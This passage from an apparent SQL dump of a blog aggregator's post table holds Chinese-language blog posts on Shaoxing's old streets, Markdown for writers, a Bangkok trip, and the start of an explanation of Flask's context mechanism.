/><figcaption>清晨的時候，許多人家都在門前生煤爐</figcaption></figure><p>閒逛處，總是能見到掛在牆上的鳥籠。這邊養鳥的人多，我在別處是沒見過的。終於認識了畫眉，披了一身翠，白色絨毛的腹上點綴了幾抹嫩黃，小巧迷人。它旁邊的鳥籠里是一隻皇鬥，灰撲撲的，不大好看，是鬥鳥，據說比畫眉貴，可是我不大喜歡。</p>\n<figure><img alt="畫眉" src="http://ww1.sinaimg.cn/large/5d261318gw1e9rtz5c1r3j21kw16o4ho.jpg" /></figure>\n<p>這一天就在城內隨便逛逛，紹興多故居，我就只去了蔡元培家。紹興城挺小的，很容易就走完了。雖然是週末，遊客也不嫌多，不像杭州的週末。紹興多水，也有遊客乘著烏蓬船沿河遊玩的，在船上拍拍照。</p>\n<p>紹興老街的生活氣息挺濃郁的，老房子里都住著人，旅遊地的商業氣不夠，反而多半是為當地人服務的，比如說棋牌室。你總能聽到麻將的碰撞聲，下棋一般又不在棋牌室里，多半是在某個小亭子里。也有老太太們坐在門口閒聊著，說著我聽不懂的中文。</p>\n<p>紹興老街醒來得早，睡得也早。不到六點，多半的商鋪就歇業了，要吃飯就要去新城地區。這個時候，紅燈籠亮起，垂在屋檐下，映在小溪里，一派舊日時光。</p>\n<figure><img alt="紹興老街的夜" src="http://ww1.sinaimg.cn/large/5d261318gw1e9rtvzl4ybj21kw16oh1u.jpg" /><figcaption>紹興老街的夜，溪邊小屋的紅燈籠</figcaption></figure>', '2014-11-06 23:42:49', 5, '2013-10-20 02:30:00', '2013-10-20 02:30:00', 0, '[["\\u738b\\u7fb2\\u4e4b", 0.42115489776536313], ["\\u8001\\u548c\\u5c1a", 0.2193317074709497], ["\\u6642\\u5019", 0.20035923189217875], ["\\u7d39\\u8208", 0.20035923189217875], ["\\u6212\\u73e0", 0.1335728212614525], ["\\u9019\\u500b", 0.1335728212614525], ["\\u58a8\\u6c60", 0.1320808503944134], ["\\u591c\\u660e\\u73e0", 0.12505728995418994], ["\\u8001\\u8857", 0.11808349879106146], ["\\u904a\\u5ba2", 0.10017961594608937], ["\\u6e05\\u6668", 0.09166015827340782], ["\\u4e0b\\u68cb", 0.0744975616582123], ["\\u68cb\\u724c\\u5ba4", 0.07378508643240224], ["\\u4e00\\u500b", 0.06678641063072625], ["\\u6642\\u5206", 0.06678641063072625], ["\\u70cf\\u84ec", 0.06678641063072625], ["\\u64da\\u805e", 0.06678641063072625], ["\\u8b1b\\u5bfa", 0.06678641063072625], ["\\u9031\\u672b", 0.06678641063072625], ["\\u751a\\u9ebc", 0.06678641063072625]]', NULL, NULL, '紹興的老街像小時候的夢，又破又舊又瑰麗。青瓦的層疊的屋頂，白粉的斑駁的牆壁，小橋，流水，人家。\n清晨的好夢被遊人的嘮叨驚醒。我入住的這家青年旅舍叫作書生部落，位於書聖故里躲婆弄內。書聖指的是王羲之，據聞此地正是王右軍居處。街角處有一個小池子，喚作墨池，相傳乃王羲之洗筆硯處，而曾鞏作《墨池記》以勉其勤奮。墨池里的兩只鵝像老去的生命，緩慢，悠閒，時常是靜止的，讓人疑心它們是雕塑。\n與墨池隔道相望的是一座寺廟，名叫戒珠寺，提匾卻叫作戒珠講寺。清晨的早課聲也是驚醒人的罪魁。據聞這座寺廟就是王羲之故居。是上午時聽一位拉包車的師傅給客人講的，如果你搜索一下「戒珠寺」當有所收穫，這位師傅倒是講得有聲有色，自然也少不了添油加醋。\n這邊有一個老和尚，和王羲之關係相當好。有一回王羲之和這個老和尚在家裡下棋，下到一半有客人來訪，王羲之把夜明珠放到桌上，先出去會客，讓老和尚稍等一下。這個夜明珠是王羲之非常喜歡的珠子，平時就拿在手上的。等王羲之回來的時候，老和尚已經走了，放在桌上的夜明珠也不見了，這期間沒有其他人來，王羲之就懷疑是這老和尚偷走了，從此就不理這老和尚。老和尚就覺得奇怪，跑過來問王羲之為甚麼不理他。王羲之的僕人就說：「你做了甚麼，你自己不知道？」後來老和尚就知道王羲之認為他偷了明珠，為了表示自己清白就上吊自殺了。再後來王羲之家來了客人，家裡殺鵝招待，從鵝的肚子里掉出來了珠子，正好就是王羲之丟掉的這個夜明珠。王羲之就曉得自己冤枉了老和尚，覺得很愧疚，就把自己的宅子捐了出來，作為寺廟，叫戒珠講寺。\n故事大抵如此，當然油醋總是會有的。附近還有一處題扇橋，又是王羲之軼事之一。石板台階的拱橋，兩邊都傍上了綠枝，拱橋下停泊著三四艘烏蓬船。橋邊有一處亭子，等到下午時分便會有老爺子過來下棋。\n\n我出門的時候是七點半的光景，這一帶不像魯迅故里，本就少有遊客，清晨時分就更少了。可是老太太們大清早就醒來了，有圍著腳踏三輪車買紅蠟的，更多的時候是在生煤爐。\n清晨的時候，許多人家都在門前生煤爐閒逛處，總是能見到掛在牆上的鳥籠。這邊養鳥的人多，我在別處是沒見過的。終於認識了畫眉，披了一身翠，白色絨毛的腹上點綴了幾抹嫩黃，小巧迷人。它旁邊的鳥籠里是一隻皇鬥，灰撲撲的，不大好看，是鬥鳥，據說比畫眉貴，可是我不大喜歡。\n\n這一天就在城內隨便逛逛，紹興多故居，我就只去了蔡元培家。紹興城挺小的，很容易就走完了。雖然是週末，遊客也不嫌多，不像杭州的週末。紹興多水，也有遊客乘著烏蓬船沿河遊玩的，在船上拍拍照。\n紹興老街的生活氣息挺濃郁的，老房子里都住著人，旅遊地的商業氣不夠，反而多半是為當地人服務的，比如說棋牌室。你總能聽到麻將的碰撞聲，下棋一般又不在棋牌室里，多半是在某個小亭子里。也有老太太們坐在門口閒聊著，說著我聽不懂的中文。\n紹興老街醒來得早，睡得也早。不到六點，多半的商鋪就歇業了，要吃飯就要去新城地區。這個時候，紅燈籠亮起，垂在屋檐下，映在小溪里，一派舊日時光。\n紹興老街的夜，溪邊小屋的紅燈籠', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(44, 'http://lepture.com/zh/2013/typography-and-markdown', '文字排印與標記語言', '<p>許多年前，我也曾想過將來要做一個文字工作者，結果現在從事了互聯網行業。這次單從互聯網從業人員的角度談文字排印。</p>\n<p>提到「標記語言」，不免會讓不知情者以為高深，其實很簡單，正如某言「無技術含量」。然而真正要做好，亦非易事。糟糕的排版隨處可見，例如在一段文字中突兀出現很大幾個字，又或者一段黑色文字中夾雜幾句紅的綠的黃的句子，更可憎的是有些文字還一閃一閃亮晶晶，這樣的例子在互聯網上比比皆是，不忍卒讀。通俗來講，稱為暴發戶氣質。</p>\n<p>好的排版（指單篇文章）是為了文章的易讀性，讓人看著愉悅看著舒服，實際經驗告訴我們，略微泛黃的奶油色底加黑色文字是讓人最愉悅的搭配。當然，除了顏色，還有字體、大小、字間距、行間距等諸多因素影響著排版的效果。</p>\n<p>做為寫作者，我們應該關注的真的是文章的顯示效果麼？當我們說「把這段文字加粗」，我們的本意是想強調這段文字，加粗只是表象，強調並不意味著一定要加粗。相反，我們所需要的是理解文字段落的本質，忽略其表現效果，一個好的開頭就是改變我們的思維方式，回歸本原，<strong>「這段文字需要著重強調一下」</strong>。</p>\n<p>正如多年前的互聯網，當時（也許現在還存在）還沒有樣式分離的觀念，前端開發者迷失在樣式的表象上，忽視了事物的本質。於是，各種 <code>&lt;font&gt;</code> 之類的 HTML 標記大行其道。但是現在的情況好很多了，比如我們會用 <code>&lt;strong&gt;</code> 而不是 <code>&lt;b&gt;</code> 來「加粗」文字，這樣的改變體現的正是觀念的轉變，<code>&lt;b&gt;</code> 意味著 bold，是表象上的加粗，<code>&lt;strong&gt;</code> 體現的是著重強調，是本質上的加粗。這是一小步改變，也是一大步改變。</p>\n<p>也許你並不了解什麼是 HTML，什麼是 <code>&lt;strong&gt;</code>，什麼是 <code>&lt;b&gt;</code>，這沒有關係，你正在看的這個網頁其實就是一個 HTML。但是你不需要知道這些。因為有更簡單，更多適合寫作者的標記語言 —— Markdown。</p>\n<p>已經有不少人談過 Markdown，例如：</p>\n<ul>\n<li><a href="http://apple4us.com/2012/02/why-writers-should-use-markdown.html">为什么作家应该用 Markdown 保存自己的文稿</a></li>\n<li><a href="http://www.yangzhiping.com/tech/r-markdown-knitr.html">Markdown 写作浅谈</a></li>\n</ul>\n<p>普遍的誤解是，這些標記語言是程式師們的東西。但是正如其作者 <a href="http://daringfireball.net/projects/markdown/">John Gruber</a> 所說：</p>\n<blockquote><p>Markdown is a text-to-HTML conversion tool for web writers.</p>\n</blockquote><p>它從一開始就不是所謂 Geek 的東西，恰恰相反，它是為你這樣的文字工作者所設計的。它很簡單，它在 IT 界所以越發流行也正是因為其簡單易學，甚至有人稱其學習成本為零。</p>\n<p>我們只需要簡單介紹一下基本的文法，聰明者如你應該不需要五分鐘就可學會。</p>\n<ul>\n<li><p>一級標題（大標題）</p>\n<pre><code># 這是一級標題</code></pre>\n</li>\n<li><p>二級標題（副標題）</p>\n<pre><code>## 這個是副標題</code></pre>\n</li>\n<li><p>那麼三級標題，四級標題也就很容易猜出來了</p>\n<pre><code>### 三級標題\n#### 四級標題</code></pre>\n</li>\n<li><p>圖片與鏈接</p>\n<pre><code>![image description](image URL)\n[link text](link URL)</code></pre>\n</li>\n<li><p>著重強調</p>\n<pre><code>*emphasize*    **strong**\n_emphasize_    __strong__</code></pre>\n</li>\n<li><p>引用的內容</p>\n<pre><code>&gt; 生命是一襲華美的袍，爬滿了虱子。</code></pre>\n</li>\n<li><p>有序列表</p>\n<pre><code>1. 有序列表第一條\n2. 有序列表第二條</code></pre>\n</li>\n<li><p>無序列表</p>\n<pre><code>* 無序列表\n* 無序列表</code></pre>\n</li>\n</ul>\n<p>現在你已經了解了所有你需要知道的了，這難道能叫做難學麼？忘記介紹段落了，你只需要保證段落之間有空行就可以了。</p>\n<p>也許你還需要一個編輯器來輔助你，例如我現在正在用 Mou 來寫作這篇文章。對，你所看到的這篇文章正是用 Markdown 寫作的。也許你對自己的寫作不放心，需要實時預覽，借助<a href="http://www.zhihu.com/question/19637157">這些工具</a>也許能讓你更放心。其實真的不需要，例如當我寫作這篇文章時，我並不需要即時預覽，我知道我寫出來的效果一定就會是我想要的。</p>\n<p>另外我正在編寫一個網頁版的 <a href="http://lab.lepture.com/editor/">Markdown 編輯器</a>，雖然還沒有完成，不過已經足以幫助你熟悉一下 Markdown 的文法了。我也為你準備了一份詳細的<a href="http://lab.lepture.com/editor/markdown">英文版文法</a>說明。</p>\n<p>也許你還會覺得這些文法不夠用，你還是想把你的文章弄得花花綠綠的，我想這篇文章不是為你而寫的。我也深深為你的審美捉急呀。</p>', '2014-11-06 23:42:49', 5, '2013-03-24 08:35:00', '2013-03-24 08:35:00', 0, '[["\\u6a19\\u984c", 0.23138259683032256], ["Markdown", 0.20567341940473116], ["\\u6211\\u5011", 0.17996424197913977], ["\\u5e8f\\u5217\\u8868", 0.1704197480180645], ["\\u6587\\u5b57", 0.16384426933212903], ["\\u52a0\\u7c97", 0.14070897262451615], ["\\u4e00\\u500b", 0.12854588712795698], ["\\u5f37\\u8abf", 0.12854588712795698], ["\\u7c21\\u55ae", 0.12854588712795698], ["strong", 0.12854588712795698], ["HTML", 0.10283670970236558], ["\\u5beb\\u4f5c", 0.10283670970236558], ["\\u4e5f\\u8a31", 0.10283670970236558], ["\\u6a19\\u8a18", 0.10283670970236558], ["\\u6539\\u8b8a", 0.10283670970236558], ["\\u9019\\u4e9b", 0.10283670970236558], ["\\u4e92\\u806f\\u7db2", 0.10283670970236558], ["\\u9700\\u8981", 0.10277266038387096], ["\\u7bc7\\u6587\\u7ae0", 0.10016892659473117], ["\\u6587\\u6cd5", 0.08828465799741934]]', NULL, NULL, '許多年前，我也曾想過將來要做一個文字工作者，結果現在從事了互聯網行業。這次單從互聯網從業人員的角度談文字排印。\n提到「標記語言」，不免會讓不知情者以為高深，其實很簡單，正如某言「無技術含量」。然而真正要做好，亦非易事。糟糕的排版隨處可見，例如在一段文字中突兀出現很大幾個字，又或者一段黑色文字中夾雜幾句紅的綠的黃的句子，更可憎的是有些文字還一閃一閃亮晶晶，這樣的例子在互聯網上比比皆是，不忍卒讀。通俗來講，稱為暴發戶氣質。\n好的排版（指單篇文章）是為了文章的易讀性，讓人看著愉悅看著舒服，實際經驗告訴我們，略微泛黃的奶油色底加黑色文字是讓人最愉悅的搭配。當然，除了顏色，還有字體、大小、字間距、行間距等諸多因素影響著排版的效果。\n做為寫作者，我們應該關注的真的是文章的顯示效果麼？當我們說「把這段文字加粗」，我們的本意是想強調這段文字，加粗只是表象，強調並不意味著一定要加粗。相反，我們所需要的是理解文字段落的本質，忽略其表現效果，一個好的開頭就是改變我們的思維方式，回歸本原，「這段文字需要著重強調一下」。\n正如多年前的互聯網，當時（也許現在還存在）還沒有樣式分離的觀念，前端開發者迷失在樣式的表象上，忽視了事物的本質。於是，各種 <font> 之類的 HTML 標記大行其道。但是現在的情況好很多了，比如我們會用 <strong> 而不是 <b> 來「加粗」文字，這樣的改變體現的正是觀念的轉變，<b> 意味著 bold，是表象上的加粗，<strong> 體現的是著重強調，是本質上的加粗。這是一小步改變，也是一大步改變。\n也許你並不了解什麼是 HTML，什麼是 <strong>，什麼是 <b>，這沒有關係，你正在看的這個網頁其實就是一個 HTML。但是你不需要知道這些。因為有更簡單，更多適合寫作者的標記語言 —— Markdown。\n已經有不少人談過 Markdown，例如：\n\n为什么作家应该用 Markdown 保存自己的文稿\nMarkdown 写作浅谈\n\n普遍的誤解是，這些標記語言是程式師們的東西。但是正如其作者 John Gruber 所說：\nMarkdown is a text-to-HTML conversion tool for web writers.\n它從一開始就不是所謂 Geek 的東西，恰恰相反，它是為你這樣的文字工作者所設計的。它很簡單，它在 IT 界所以越發流行也正是因為其簡單易學，甚至有人稱其學習成本為零。\n我們只需要簡單介紹一下基本的文法，聰明者如你應該不需要五分鐘就可學會。\n\n一級標題（大標題）\n# 這是一級標題\n\n二級標題（副標題）\n## 這個是副標題\n\n那麼三級標題，四級標題也就很容易猜出來了\n### 三級標題\n#### 四級標題\n\n圖片與鏈接\n![image description](image URL)\n[link text](link URL)\n\n著重強調\n*emphasize*    **strong**\n_emphasize_    __strong__\n\n引用的內容\n> 生命是一襲華美的袍，爬滿了虱子。\n\n有序列表\n1. 有序列表第一條\n2. 有序列表第二條\n\n無序列表\n* 無序列表\n* 無序列表\n\n\n現在你已經了解了所有你需要知道的了，這難道能叫做難學麼？忘記介紹段落了，你只需要保證段落之間有空行就可以了。\n也許你還需要一個編輯器來輔助你，例如我現在正在用 Mou 來寫作這篇文章。對，你所看到的這篇文章正是用 Markdown 寫作的。也許你對自己的寫作不放心，需要實時預覽，借助這些工具也許能讓你更放心。其實真的不需要，例如當我寫作這篇文章時，我並不需要即時預覽，我知道我寫出來的效果一定就會是我想要的。\n另外我正在編寫一個網頁版的 Markdown 編輯器，雖然還沒有完成，不過已經足以幫助你熟悉一下 Markdown 的文法了。我也為你準備了一份詳細的英文版文法說明。\n也許你還會覺得這些文法不夠用，你還是想把你的文章弄得花花綠綠的，我想這篇文章不是為你而寫的。我也深深為你的審美捉急呀。', NULL, NULL, NULL),
(45, 'http://lepture.com/zh/2012/hello-bangkok', '早安曼谷', '<blockquote><p>沒有睡過機場的旅行不完整。</p>\n</blockquote><p>彭哲夫如是說。</p>\n<p>到達曼谷的時候是午夜，第一個夜晚便在機場度過。於是，旅行從一開始就完整了——也許並不是，因為不曾睡過。這一天是 2012 年九月五號。</p>\n<p>曼谷的機場，空調開得很冷，在 Money Exchange 兌換了一點鈔票（Tips: 匯率極差，後來才發現，原來從 ATM 里直接取鈔匯率會更好），馬上就去星巴克點了杯熱飲，暖和一下，也順便給手機充一下電。</p>\n<p>無事可做，又沒有網路，只好发呆。拿起 Kindle 看了點書，是齊邦媛的《巨流河》。後來連書也看不下去了，終於鼓起了勇氣 Say Hello。</p>\n<figure><img alt="曼谷機場" src="http://i.imgur.com/q1Ck3.jpg" /></figure>\n<p>Sunny 是泰國人，但是長著一副歐洲人的面孔，英文說得又好，如果他不說，我是萬料不到的。後來見到的泰國人也確實同 Sunny 長得不一樣，也許是混血吧。</p>\n<p>他教我用 Foursquare，我才發現以前從未用過 Explore 的功能，而且因為沒有了中國政府，地圖定位精確，Explore 可算是幫了大忙。他又慷慨地分享網路給我，為我挑選了一些景點做了個 Foursquare List，順便下載了幾個關於曼谷的 App（雖然後來也沒用過）。</p>\n<p>這是我在泰國陸地上遇到的第一個泰國人，給了我很大幫助。</p>\n<p>大約五點的光景，快到 City Line 的首班時間，同 Sunny 告別後便到樓下等車。</p>\n<p>也不知是從哪裡看來的一條路線（豆瓣？），大約是這樣的：</p>\n<ol>\n<li>City Line 到 BTS phaya thai 下車</li>\n<li>乘坐 BTS 到 Siam 換乘 W 線</li>\n<li>到 Saphan Taksin 下車，到天橋下換乘曼谷水上巴士</li>\n<li>到 Tha Phra Athit 下船，去 Khaosan。</li>\n</ol>\n<p>BTS 其實就是城市輕軌，也許因為早晨的原因，BTS 上沒什麼遊客。車上多是看報的泰國人，當然也有玩手機的。有一份報紙，叫《M2F》，是免費發放的，所以車上看到的報紙大多是這一份，到天橋下乘船時，也有人給我派發報紙，這是第一次被人錯看成泰國人。</p>\n<p>然後轉乘水上巴士。船有多種，實在分不清也沒關係，總之不要去坐 Tourist Boat 就好，貴。</p>\n<p>湄公河的水很混濁，黃滾滾的，水面上漂浮著樹枝，向下游蕩去，起起浮浮。沿河兩岸，有時是破舊的未完工的樓，有時是富麗的皇宮或者佛寺，因為睡眠不足，大多錯過了，頗為可惜。</p>\n<p>水路很長，多虧了售票阿姨的提醒，算是順利抵達。</p>\n<p>上了岸，旅途才剛剛開始，早安曼谷。</p>', '2014-11-06 23:42:49', 5, '2012-11-21 16:00:00', '2012-11-21 16:00:00', 0, '[["\\u6cf0\\u570b\\u4eba", 0.23719776791468253], ["BTS", 0.18975821433174603], ["\\u66fc\\u8c37", 0.1811506553077381], ["\\u56e0\\u70ba", 0.14231866074880953], ["\\u6a5f\\u5834", 0.14231866074880953], ["Sunny", 0.14231866074880953], ["\\u5831\\u7d19", 0.09487910716587301], ["\\u5929\\u6a4b", 0.09487910716587301], ["\\u7761\\u904e", 0.09487910716587301], ["Explore", 0.09487910716587301], ["Line", 0.09487910716587301], ["\\u5927\\u7d04", 0.09487910716587301], ["\\u9019\\u662f", 0.09487910716587301], ["\\u9806\\u4fbf", 0.09487910716587301], ["\\u532f\\u7387", 0.09487910716587301], ["City", 0.09487910716587301], ["\\u767c\\u73fe", 0.09487910716587301], ["Foursquare", 0.09487910716587301], ["\\u8eca\\u4e0a", 0.09487910716587301], ["\\u6709\\u6642", 0.09487910716587301]]', NULL, NULL, '沒有睡過機場的旅行不完整。\n彭哲夫如是說。\n到達曼谷的時候是午夜，第一個夜晚便在機場度過。於是，旅行從一開始就完整了——也許並不是，因為不曾睡過。這一天是 2012 年九月五號。\n曼谷的機場，空調開得很冷，在 Money Exchange 兌換了一點鈔票（Tips: 匯率極差，後來才發現，原來從 ATM 里直接取鈔匯率會更好），馬上就去星巴克點了杯熱飲，暖和一下，也順便給手機充一下電。\n無事可做，又沒有網路，只好发呆。拿起 Kindle 看了點書，是齊邦媛的《巨流河》。後來連書也看不下去了，終於鼓起了勇氣 Say Hello。\n\nSunny 是泰國人，但是長著一副歐洲人的面孔，英文說得又好，如果他不說，我是萬料不到的。後來見到的泰國人也確實同 Sunny 長得不一樣，也許是混血吧。\n他教我用 Foursquare，我才發現以前從未用過 Explore 的功能，而且因為沒有了中國政府，地圖定位精確，Explore 可算是幫了大忙。他又慷慨地分享網路給我，為我挑選了一些景點做了個 Foursquare List，順便下載了幾個關於曼谷的 App（雖然後來也沒用過）。\n這是我在泰國陸地上遇到的第一個泰國人，給了我很大幫助。\n大約五點的光景，快到 City Line 的首班時間，同 Sunny 告別後便到樓下等車。\n也不知是從哪裡看來的一條路線（豆瓣？），大約是這樣的：\n\nCity Line 到 BTS phaya thai 下車\n乘坐 BTS 到 Siam 換乘 W 線\n到 Saphan Taksin 下車，到天橋下換乘曼谷水上巴士\n到 Tha Phra Athit 下船，去 Khaosan。\n\nBTS 其實就是城市輕軌，也許因為早晨的原因，BTS 上沒什麼遊客。車上多是看報的泰國人，當然也有玩手機的。有一份報紙，叫《M2F》，是免費發放的，所以車上看到的報紙大多是這一份，到天橋下乘船時，也有人給我派發報紙，這是第一次被人錯看成泰國人。\n然後轉乘水上巴士。船有多種，實在分不清也沒關係，總之不要去坐 Tourist Boat 就好，貴。\n湄公河的水很混濁，黃滾滾的，水面上漂浮著樹枝，向下游蕩去，起起浮浮。沿河兩岸，有時是破舊的未完工的樓，有時是富麗的皇宮或者佛寺，因為睡眠不足，大多錯過了，頗為可惜。\n水路很長，多虧了售票阿姨的提醒，算是順利抵達。\n上了岸，旅途才剛剛開始，早安曼谷。', NULL, NULL, NULL),
(46, 'https://blog.tonyseek.com/post/the-context-mechanism-of-flask/', 'Flask 的 Context 机制', '<p><em>TL;DR</em> <em>文长慎入</em></p>\n<p>用过 Flask 做 Web 开发的同学应该不会不记得 App Context 和 Request Context 这两个名字——这两个 Context 算是 Flask 中比较特色的设计。<a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id11" id="id1">[1]</a></p>\n<p>从一个 Flask App 读入配置并启动开始，就进入了 App Context，在其中我们可以访问配置文件、打开资源文件、通过路由规则反向构造 URL。<a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id12" id="id2">[2]</a> 当一个请求进入开始被处理时，就进入了 Request Context，在其中我们可以访问请求携带的信息，比如 HTTP Method、表单域等。<a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id13" id="id3">[3]</a></p>\n<p>所以，这两个 Context 也成了 Flask 框架复杂度比较集中的地方，对此有评价认为 Flask 的这种设计比 Django、Tornado 等框架的设计更为晦涩。<a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id14" id="id4">[4]</a> 我不认同这种评价。对于一个 Web 应用来说，“应用” 和 “请求” 的两级上下文在理念上是现实存在的，如果理解了它们，那么使用 Flask 并不会晦涩；即使是使用 Django、Tornado，理解了它们的 Context 也非常有利于做比官网例子更多的事情（例如编写 Middleware）。</p>\n<p>我因为开发 Flask 扩展，对这两个 Context 的具体实现也研究了一番，同时还解决了一些自己之前“知道结论不知道过程”的疑惑，所以撰写本文记录下来。</p>\n<div class="section" id="thread-local">\n<h2>Thread Local 的概念</h2>\n<p>从面向对象设计的角度看，对象是保存“状态”的地方。Python 也是如此，一个对象的状态都被保存在对象携带的一个特殊字典中，可以通过 <tt class="docutils literal">vars</tt> 函数拿到它。</p>\n<p>Thread Local 则是一种特殊的对象，它的“状态”对线程隔离 —— 也就是说每个线程对一个 Thread Local 对象的修改都不会影响其他线程。这种对象的实现原理也非常简单，只要以线程的 ID 来保存多份状态字典即可，就像按照门牌号隔开的一格一格的信箱。</p>\n<p>在 Python 中获得一个这样的 Thread Local 最简单的方法是 <tt class="docutils literal">threading.local()</tt>：</p>\n<figure class="code"><figcaption><span>Python Shell</span></figcaption><div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">threading</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">storage</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">local</span><span class="p">()</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">storage</span><span class="o">.</span><span class="n">foo</span> <span class="o">=</span> <span class="mi">1</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="n">storage</span><span class="o">.</span><span class="n">foo</span><span class="p">)</span>\n<span class="mi">1</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="k">class</span> <span class="nc">AnotherThread</span><span class="p">(</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">):</span>\n<span class="o">...</span>     <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n<span class="o">...</span>         <span class="n">storage</span><span class="o">.</span><span class="n">foo</span> <span class="o">=</span> <span class="mi">2</span>\n<span class="o">...</span>         <span class="k">print</span><span class="p">(</span><span class="n">storage</span><span class="o">.</span><span class="n">foo</span><span class="p">)</span>  <span class="c"># 这这个线程里已经修改了</span>\n<span class="o">&gt;&gt;&gt;</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">another</span> <span class="o">=</span> <span class="n">AnotherThread</span><span class="p">()</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">another</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>\n<span class="mi">2</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span><span class="p">(</span><span class="n">storage</span><span class="o">.</span><span class="n">foo</span><span class="p">)</span>  <span class="c"># 但是在主线程里并没有修改</span>\n<span class="mi">1</span>\n</pre></div>\n</figure><p>这样来说，只要能构造出 Thread Local 对象，就能够让同一个对象在多个线程下做到状态隔离。这个“线程”不一定要是系统线程，也可以是用户代码中的其他调度单元，例如 Greenlet。<a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id15" id="id5">[5]</a></p>\n</div>\n<div class="section" id="werkzeug-local-stack-local-proxy">\n<h2>Werkzeug 实现的 Local Stack 和 Local Proxy</h2>\n<p>Werkzeug 没有直接使用 <tt class="docutils literal">threading.local</tt>，而是自己实现了 <tt class="docutils literal">werkzeug.local.Local</tt> 类。后者和前者有一些区别：</p>\n<ul class="simple">\n<li>后者会在 Greenlet 可用的情况下优先使用 Greenlet 的 ID 而不是线程 ID 以支持 Gevent 或 Eventlet 的调度，前者只支持多线程调度；</li>\n<li>后者实现了 Werkzeug 定义的协议方法 <tt class="docutils literal">__release_local__</tt>，可以被 Werkzeug 自己的 release_pool 函数释放（析构）掉当前线程下的状态，前者没有这个能力。</li>\n</ul>\n<p>除 Local 外，Werkzeug 还实现了两种数据结构：LocalStack 和 LocalProxy。</p>\n<p>LocalStack 是用 Local 实现的栈结构，可以将对象推入、弹出，也可以快速拿到栈顶对象。当然，所有的修改都只在本线程可见。和 Local 一样，LocalStack 也同样实现了支持 release_pool 的接口。</p>\n<p>LocalProxy 则是一个典型的代理模式实现，它在构造时接受一个 callable 的参数（比如一个函数），这个参数被调用后的返回值本身应该是一个 Thread Local 对象。对一个 LocalProxy 对象的所有操作，包括属性访问、方法调用（当然方法调用就是属性访问）甚至是二元操作 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id16" id="id6">[6]</a> 都会转发到那个 callable 参数返回的 Thread Local 对象上。</p>\n<p>LocalProxy 的一个使用场景是 LocalStack 的 <tt class="docutils literal">__call__</tt> 方法。比如 <tt class="docutils literal">my_local_stack</tt> 是一个 LocalStack 实例，那么 <tt class="docutils literal">my_local_stack()</tt> 能返回一个 LocalProxy 对象，这个对象始终指向 <tt class="docutils literal">my_local_stack</tt> 的栈顶元素。如果栈顶元素不存在，访问这个 LocalProxy 的时候会抛出 <tt class="docutils literal">RuntimeError</tt>。</p>\n</div>\n<div class="section" id="flask-local-stack-context">\n<h2>Flask 基于 Local Stack 的 Context</h2>\n<p>Flask 是一个基于 Werkzeug 实现的框架，所以 Flask 的 App Context 和 Request Context 也理所当然地基于 Werkzeug 的 Local Stack 实现。</p>\n<p>在概念上，App Context 代表了“应用级别的上下文”，比如配置文件中的数据库连接信息；Request Context 代表了“请求级别的上下文”，比如当前访问的 URL。</p>\n<p>这两种上下文对象的类定义在 <tt class="docutils literal">flask.ctx</tt> 中，它们的用法是推入 <tt class="docutils literal">flask.globals</tt> 中创建的 <tt class="docutils literal">_app_ctx_stack</tt> 和 <tt class="docutils literal">_request_ctx_stack</tt> 这两个单例 Local Stack 中。因为 Local Stack 的状态是线程隔离的，而 Web 应用中每个线程（或 Greenlet）同时只处理一个请求，所以 App Context 对象和 Request Context 对象也是请求间隔离的。</p>\n<p>当 <tt class="docutils literal">app = Flask(__name__)</tt> 构造出一个 Flask App 时，App Context 并不会被自动推入 Stack 中。所以此时 Local Stack 的栈顶是空的，<tt class="docutils literal">current_app</tt> 也是 unbound 状态。</p>\n<figure class="code"><figcaption><span>Python Shell</span></figcaption><div class="highlight"><pre><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">flask.globals</span> <span class="kn">import</span> <span class="n">_app_ctx_stack</span><span class="p">,</span> <span class="n">_request_ctx_stack</span>\n<span class="o">&gt;&gt;&gt;</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">_app_ctx_stack</span><span class="o">.</span><span class="n">top</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">_request_ctx_stack</span><span class="o">.</span><span class="n">top</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">_app_ctx_stack</span><span class="p">()</span>\n<span class="o">&lt;</span><span class="n">LocalProxy</span> <span class="n">unbound</span><span class="o">&gt;</span>\n<span class="o">&gt;&gt;&gt;</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">current_app</span>\n<span class="o">&gt;&gt;&gt;</span> <span class="n">current_app</span>\n<span class="o">&lt;</span><span class="n">LocalProxy</span> <span class="n">unbound</span><span class="o">&gt;</span>\n</pre></div>\n</figure><p>这也是一些 Flask 用户可能被坑的地方 —— 比如编写一个离线脚本时，如果直接在一个 Flask-SQLAlchemy 写成的 Model 上调用 